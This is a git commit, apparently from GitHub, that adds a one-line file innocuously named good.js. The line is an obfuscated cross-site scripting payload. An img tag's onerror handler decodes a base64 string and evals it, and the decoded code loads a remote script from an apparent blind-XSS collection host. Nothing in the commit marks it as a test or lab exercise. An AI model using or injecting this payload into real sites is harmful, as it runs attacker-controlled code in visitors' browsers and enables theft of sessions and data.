09a73410767b7a2072fc6566850e6f2336636407
Ghost_Shell <91254737+Ghost00Shell@users.noreply.github.com>
2023-12-26 18:11:03 +0200

    Create good.js

---
+++ good.js
@@ -0,0 +1,1 @@
+"><img src="https://script.google.com/macros/s/AKfycbzk5V0AsAdgJM3-sPUbLs4wYEV3d68FE3VYRlU-PbMfr5Vh5TgKiKC_UJiNwo19aqULbg/exec" id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2dob3N0c2hlbGwiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
